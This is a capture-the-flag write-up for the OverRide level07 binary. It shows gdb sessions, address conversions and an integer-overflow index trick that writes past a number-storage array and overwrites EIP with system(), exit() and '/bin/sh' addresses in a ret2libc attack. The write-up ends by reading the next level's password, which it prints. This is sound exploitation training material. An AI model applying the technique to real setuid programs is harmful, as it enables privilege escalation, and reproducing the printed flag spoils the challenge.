Level07 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

Level07 rights:
```Shell
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
```

Testing the binary:
```Shell
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store 
 Number: 111
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 111
 Completed read command successfully
 Input command: store
 Number: -1
 Index: 2
 Completed store command successfully
Input command: read
 Index: 2
 Number at data[2] is 4294967295
```
The program allows us to store numbers in an array and display them.

Decompiling with Hex-Rays on https://dogbolt.org/ shows us that:
- there is an array of unsigned int of 100 elements
- the index provided by the user is used without checking if it exceeds the size of the array
- you cannot store numbers at any index that is a multiple of 3. 

We can't do a format string attack nor a buffer overflow, so our only way to exploit the binary is to use the `store` command to write on the stack. The vulnerability lies in the fact that you can store values outside the array. Our goal is to do a `ret2libc` attack by finding `EIP` and overwrite it with `system()`.

We will first retrieve the addresses of `system()`, `exit()` and `/bin/sh`:
```Shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
```

Since the program only deals with decimal numbers, we must convert the addresses from hexa to decimal:
```
system: 0xf7e6aed0 -> 4159090384
exit: 0xf7e5eb70 -> 4159040368
/bin/sh: 0xf7f897ec -> 4160264172
```

Now, we need to know at which index we should store the address of `system()`. Using `gdb-peda`, we found the offset between `EIP` and the beginning of our array by placing a breakpoint right after the call to `read()` and inspect the values:
```Shell
Guessed arguments:
arg[0]: 0xffffcdf4 --> 0x0 
[...]
gdb-peda$ i f
[...]
 Saved registers:
[...]
  eip at 0xffffcfbc
```

`0xffffcdf4` is the address of the start of the array. `0xffffcfbc` is the address of `EIP`. Subtracting the address of the array from `EIP` give us an offset of 456 bytes (0xffffcfbc - 0xffffcdf4).
This is an array of `int` so each element has a size of 4 bytes. If we do 456 / 4, we get `114`, which corresponds to the index we must access. 
First, let's run a check to see if we have the correct value:
```Shell
Input command: store
 Number: 258
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
 ```
We can't use the 114th index because it's a multiple of 3. But perhaps overflowing it could allow us to reach 114 anyway. The program multiplies the index by 4, so if we use `MAX_UINT_32 / 4` and add 114, we get `1073741938`, which is the same as 114.

Now, for testing purposes, let's try to change `EIP` by '0xaaaaaaaa' (2863311530 in decimal):
```Shell
Input command: store
 Number: 2863311530
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 2863311530
 Completed read command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0xaaaaaaaa in ?? ()
```
It seems to work!
Therefore storing `system()`, `exit()` and `/bin/sh` addresses at indices 114, 115, 116 should open a terminal.

Here is the result:
```Shell
Input command: store
 Number: 4159090384                           // system()
 Index: 1073741938                            // index 114
 Completed store command successfully         
Input command: store
 Number: 4159040368                           // exit()
 Index: 115
 Completed store command successfully           
Input command: store
 Number: 4160264172                           // /bin/sh
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```